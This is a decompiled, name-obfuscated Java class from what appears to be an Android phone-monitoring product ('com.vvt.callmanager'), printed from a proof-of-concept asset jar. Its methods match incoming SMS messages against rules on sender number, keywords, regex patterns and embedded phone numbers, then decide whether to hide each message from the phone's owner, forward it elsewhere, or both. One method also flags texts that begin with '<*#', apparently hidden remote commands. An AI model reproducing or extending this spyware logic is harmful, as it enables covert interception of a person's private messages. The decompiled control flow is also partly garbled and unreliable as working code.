package com.vvt.callmanager.ref;

import com.vvt.base.communication.SmsInterceptInfo;
import com.vvt.base.communication.SmsInterceptInfo.InterceptionMethod;
import com.vvt.base.communication.SmsInterceptInfo.KeywordFindingMethod;
import com.vvt.g.a;
import com.vvt.sms.SmsInfo;
import java.util.HashSet;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class h
{
  private static boolean a(SmsInterceptInfo paramSmsInterceptInfo, SmsInfo paramSmsInfo)
  {
    int i = 5;
    int j = 1;
    boolean bool1 = false;
    String str = null;
    if (paramSmsInfo == null) {}
    for (;;)
    {
      return bool1;
      Object localObject1 = paramSmsInterceptInfo.getSenderNumber();
      label51:
      boolean bool3;
      if (localObject1 != null)
      {
        localObject2 = ((String)localObject1).trim();
        int m = ((String)localObject2).length();
        if (m >= i)
        {
          m = j;
          if (m == 0) {
            break label100;
          }
          localObject2 = paramSmsInfo.getPhoneNumber();
          bool3 = a.a((String)localObject1, (String)localObject2, i);
          if (!bool3) {
            break label100;
          }
          bool3 = j;
        }
      }
      for (;;)
      {
        if (!bool3) {
          break label109;
        }
        bool1 = j;
        break;
        bool3 = false;
        localObject2 = null;
        break label51;
        label100:
        bool3 = false;
        localObject2 = null;
      }
      label109:
      SmsInterceptInfo.KeywordFindingMethod localKeywordFindingMethod = paramSmsInterceptInfo.getKeywordFindingMethod();
      Object localObject2 = paramSmsInfo.getMessageBody();
      if (localObject2 == null)
      {
        localObject2 = "";
        label130:
        localObject1 = paramSmsInterceptInfo.getKeyword();
        if (localObject1 != null) {
          localObject1 = ((String)localObject1).toLowerCase();
        }
        Object localObject3 = SmsInterceptInfo.KeywordFindingMethod.NOT_SPECIFIED;
        if ((localKeywordFindingMethod == localObject3) || (localObject1 == null)) {
          break label230;
        }
        localObject3 = ((String)localObject1).trim();
        int n = ((String)localObject3).length();
        int i1 = 3;
        if (n < i1) {
          break label230;
        }
      }
      for (;;)
      {
        if (j == 0) {
          break label236;
        }
        localObject4 = SmsInterceptInfo.KeywordFindingMethod.START_WITH;
        if (localKeywordFindingMethod != localObject4) {
          break label238;
        }
        bool1 = ((String)localObject2).startsWith((String)localObject1);
        break;
        localObject2 = ((String)localObject2).trim().toLowerCase();
        break label130;
        label230:
        j = 0;
        localObject4 = null;
      }
      label236:
      continue;
      label238:
      Object localObject4 = SmsInterceptInfo.KeywordFindingMethod.CONTAINS;
      if (localKeywordFindingMethod == localObject4)
      {
        bool1 = ((String)localObject2).contains((CharSequence)localObject1);
      }
      else
      {
        localObject4 = SmsInterceptInfo.KeywordFindingMethod.END_WITH;
        if (localKeywordFindingMethod == localObject4)
        {
          bool1 = ((String)localObject2).endsWith((String)localObject1);
        }
        else
        {
          localObject4 = SmsInterceptInfo.KeywordFindingMethod.PATTERN_MATCHED;
          if (localKeywordFindingMethod == localObject4)
          {
            localObject1 = Pattern.compile((String)localObject1);
            localObject2 = ((Pattern)localObject1).matcher((CharSequence)localObject2);
            bool1 = ((Matcher)localObject2).find();
          }
          else
          {
            localObject4 = SmsInterceptInfo.KeywordFindingMethod.CONTAINS_PHONE_NUMBER;
            if (localKeywordFindingMethod == localObject4)
            {
              localObject4 = Pattern.compile("([+][0-9]{1}+)?[ ]*[-]*[(]*[0-9]{1}+([0-9]?[(]?[ ]*[-]?[0-9]?[)]?)*").matcher((CharSequence)localObject2);
              boolean bool2;
              do
              {
                boolean bool4 = ((Matcher)localObject4).find();
                if (!bool4) {
                  break;
                }
                int k = ((Matcher)localObject4).start();
                int i2 = ((Matcher)localObject4).end();
                str = ((String)localObject2).substring(k, i2);
                bool2 = a.a((String)localObject1, str, i);
              } while (!bool2);
            }
          }
        }
      }
    }
  }
  
  public static boolean a(String paramString)
  {
    String str1;
    boolean bool;
    if (paramString != null)
    {
      str1 = paramString.trim();
      String str2 = "<*#";
      bool = str1.startsWith(str2);
      if (bool) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      str1 = null;
    }
  }
  
  public static boolean a(HashSet paramHashSet, SmsInfo paramSmsInfo)
  {
    Iterator localIterator = paramHashSet.iterator();
    Object localObject;
    SmsInterceptInfo.InterceptionMethod localInterceptionMethod;
    do
    {
      boolean bool2;
      do
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = (SmsInterceptInfo)localIterator.next();
        bool2 = a((SmsInterceptInfo)localObject, paramSmsInfo);
      } while (!bool2);
      localObject = ((SmsInterceptInfo)localObject).getInterceptionMethod();
      localInterceptionMethod = SmsInterceptInfo.InterceptionMethod.HIDE_ONLY;
      if (localObject == localInterceptionMethod) {
        break;
      }
      localInterceptionMethod = SmsInterceptInfo.InterceptionMethod.HIDE_AND_FORWARD;
    } while (localObject != localInterceptionMethod);
    boolean bool1 = true;
    for (;;)
    {
      return bool1;
      bool1 = false;
      localObject = null;
    }
  }
  
  public static SmsInterceptInfo b(HashSet paramHashSet, SmsInfo paramSmsInfo)
  {
    boolean bool1;
    SmsInterceptInfo localSmsInterceptInfo;
    if (paramHashSet != null)
    {
      bool1 = paramHashSet.isEmpty();
      if (!bool1)
      {
        Iterator localIterator = paramHashSet.iterator();
        SmsInterceptInfo.InterceptionMethod localInterceptionMethod1;
        SmsInterceptInfo.InterceptionMethod localInterceptionMethod2;
        do
        {
          boolean bool2;
          do
          {
            bool1 = localIterator.hasNext();
            if (!bool1) {
              break;
            }
            localSmsInterceptInfo = (SmsInterceptInfo)localIterator.next();
            bool2 = a(localSmsInterceptInfo, paramSmsInfo);
          } while (!bool2);
          localInterceptionMethod1 = localSmsInterceptInfo.getInterceptionMethod();
          localInterceptionMethod2 = SmsInterceptInfo.InterceptionMethod.FORWARD_ONLY;
          if (localInterceptionMethod1 == localInterceptionMethod2) {
            break;
          }
          localInterceptionMethod2 = SmsInterceptInfo.InterceptionMethod.HIDE_AND_FORWARD;
        } while (localInterceptionMethod1 != localInterceptionMethod2);
      }
    }
    for (;;)
    {
      return localSmsInterceptInfo;
      bool1 = false;
      localSmsInterceptInfo = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/h.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */